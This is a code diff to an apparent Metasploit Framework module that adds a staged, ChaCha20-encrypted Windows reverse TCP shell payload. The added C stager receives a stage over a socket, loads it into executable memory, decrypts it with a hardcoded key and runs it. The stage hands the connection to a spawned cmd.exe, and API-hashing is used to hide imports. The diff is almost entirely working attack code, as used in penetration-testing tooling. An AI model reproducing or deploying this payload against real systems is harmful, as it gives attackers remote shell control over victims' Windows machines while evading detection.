@@ -4,6 +4,7 @@ require 'msf/core'
 require 'rex/peparsey'
 require 'msf/core/payload/windows/encrypted_payload_opts'
 require 'metasploit/framework/compiler/mingw'
+require 'rex/crypto/chacha20'
 
 module Msf
 
@@ -15,7 +16,6 @@ module Msf
 module Payload::Windows::EncryptedReverseTcp
 
   include Msf::Payload::Windows
-  include Msf::Payload::Single
   include Msf::Payload::Windows::EncryptedPayloadOpts
 
   def initialize(*args)
@@ -32,14 +32,19 @@ module Payload::Windows::EncryptedReverseTcp
 
     # c source code must be generated first,
     # then compilation and removal of null bytes
-    src = generate_c_src(conf)
+    src = ''
+    if staged?
+      src = generate_stager(conf)
+    else
+      src = generate_c_src(conf)
+    end
 
     compile_opts =
     {
-      strip_symbols: datastore['StripSymbols'],
+      strip_symbols: false,
       linker_script: datastore['LinkerScript'],
       align_obj:     datastore['AlignObj'] || '',
-      f_name:        'reverse_pic.exe',
+      f_name:        (staged? ? 'reverse_pic_staged.exe' : 'reverse_pic.exe'),
       arch:          self.arch_to_s
     }
 
@@ -56,11 +61,15 @@ module Payload::Windows::EncryptedReverseTcp
     text_section.rawdata
   end
 
-  def generate_c_src(conf)
+  def initial_code
     src = headers
     src << chacha_key
     src << chacha_func
     src << exit_proc
+  end
+
+  def generate_stager(conf)
+    src = initial_code
 
     if conf[:call_wsastartup]
       src << init_winsock
@@ -70,6 +79,36 @@ module Payload::Windows::EncryptedReverseTcp
     src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
     src << start_comm
+    src << stager_comm
+  end
+
+  def generate_stage(opts={})
+    key = "HKa1Rt3KdxCf35I3kS1RUGh6MXSfqEC4"
+    nonce = "bCsEzT3QbCsE"
+    block_count = "\x01\x00\x00\x00"
+    iv = block_count + nonce
+=begin
+    src = initial_code
+    src << init_proc
+    src << exec_payload_stage
+=end
+    src = super(opts)
+    src = Rex::Crypto.chacha_encrypt(key, iv, src)
+  end
+
+  def generate_c_src(conf)
+    src = initial_code
+
+    if conf[:call_wsastartup]
+      src << init_winsock
+    end
+
+    src << comm_setup
+    src << init_proc
+    src << get_load_library(conf[:host], conf[:port])
+    src << call_init_winsock if conf[:call_wsastartup]
+    src << start_comm
+    src << single_comm
   end
 
   def get_hash(lib, func)
@@ -194,7 +233,11 @@ module Payload::Windows::EncryptedReverseTcp
 
         return first;
       }
+    ^
+  end
 
+  def init_proc
+    %Q^
       HANDLE* init_process(SOCKET s)
       {
         char cmd[] = { 'c', 'm', 'd', 0 };
@@ -348,6 +391,11 @@ module Payload::Windows::EncryptedReverseTcp
           ExitProcess(proc_term_status);
         }
 
+      ^
+   end
+
+  def single_comm
+    %Q^  
         HANDLE *comm_handles = init_process(conn_socket);
         communicate(*(comm_handles), *(comm_handles+1), conn_socket);
 
@@ -355,6 +403,57 @@ module Payload::Windows::EncryptedReverseTcp
         CloseHandle(*(comm_handles + 1));
         WSACleanup = (FuncWSACleanup) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSACleanup')}); // hash('ws2_32.dll', 'WSACleanup') -> 0xf44a6e2b
       }
+    ^
+  end
+
+  def stager_comm
+    %Q^
+        FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
+        unsigned int stage_size;
+        int recvd = RecvData(conn_socket, (char *) &stage_size, 4, 0);
+        if(recvd != 4)
+        {
+          ExitProcess(proc_term_status);
+        }
+
+        FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
+        register char *received = VirtualAlloc(NULL, stage_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        int recv_stg = RecvData(conn_socket, received, stage_size, 0);
+        if(recv_stg != stage_size)
+        {
+          ExitProcess(proc_term_status);
+        }
+
+        char *stage = chacha_data(received, stage_size);
+        // hand the socket to the stage
+        asm("movl %0, %%edi"
+            :
+            : "r" (conn_socket)
+            : "%edi"
+        );
+
+        // call the stage
+        void (*func)() = (void(*)())stage;
+        func();
+      }
+    ^
+  end
+
+  def exec_payload_stage
+    %Q^
+     void ExecutePayload()
+     {
+       SOCKET conn_socket = INVALID_SOCKET;
+
+       asm("movl %%edi, %0"
+           :
+           :"m"(conn_socket)
+       );
+
+       HANDLE *comm_handles = init_process(conn_socket);
+       communicate(*(comm_handles), *(comm_handles+1), conn_socket);
+     } 
     ^
   end
 end
